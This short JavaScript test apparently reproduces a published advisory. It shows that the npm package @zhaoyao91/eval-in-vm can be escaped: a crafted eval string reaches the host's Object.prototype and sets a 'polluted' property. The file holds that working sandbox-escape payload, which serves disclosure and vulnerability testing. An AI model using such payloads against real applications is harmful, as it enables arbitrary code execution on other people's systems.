//https://github.com/advisories/GHSA-54qm-37qr-w5wq
test("Arbitrary code execution in @zhaoyao91/eval-in-vm", () => {
  const eval1 = require("@zhaoyao91/eval-in-vm");
  expect({}.polluted).toBe(undefined);

  try {
    ("use strict");
    const result = eval1("1 + (this.constructor.prototype.polluted = `yes`);");
  } catch (error) {}

  expect({}.polluted).toBe("yes");
});
